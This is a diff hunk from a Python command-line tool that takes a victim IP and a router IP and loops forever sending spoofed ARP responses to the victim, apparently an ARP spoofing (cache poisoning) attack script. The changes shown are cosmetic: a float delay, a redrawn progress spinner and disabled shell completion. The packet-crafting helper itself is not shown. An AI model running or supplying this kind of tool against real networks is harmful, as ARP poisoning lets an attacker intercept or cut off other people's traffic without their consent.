@@ -7,18 +7,17 @@ import random
 import time
 import itertools
 
-app = typer.Typer()
+app = typer.Typer(add_completion=False)
 
 @app.command()
-def entry_point(victim_ip: str = typer.Argument(..., help="The ip of the victim device"), router_ip: str = typer.Argument(..., help="The ip of the router"), delay: int = typer.Option(5, help="The delay between packets"), mac_addr: Optional[str] = typer.Option("", help="The mac address to send to the victim", show_default="random")):
+def entry_point(victim_ip: str = typer.Argument(..., help="The ip of the victim device"), router_ip: str = typer.Argument(..., help="The ip of the router"), delay: float = typer.Option(5.0, help="The delay between packets"), mac_addr: Optional[str] = typer.Option("", help="The mac address to send to the victim", show_default="random")):
     # I'll leave checking if the ip is valid
     # as an exercise to the reader
-    typer.echo("")
     pkcnt = 0
     for i in itertools.cycle("|/-\\"):
         send_arp_response(victim_ip, router_ip, mac_addr)
         pkcnt += 1
-        typer.echo("\33[A\r"+typer.style(i,fg="red")+typer.style(" [",fg="yellow",bold=True) + typer.style(str(pkcnt),fg="yellow")+typer.style("]",fg="yellow",bold=True))
+        typer.echo("\r"+typer.style(i,fg="red")+typer.style(" [",fg="yellow",bold=True) + typer.style(str(pkcnt),fg="yellow")+typer.style("]",fg="yellow",bold=True), nl=False)
         time.sleep(delay)
 
 def get_mac_address(unicast: bool = False, universal: bool = False) -> str:
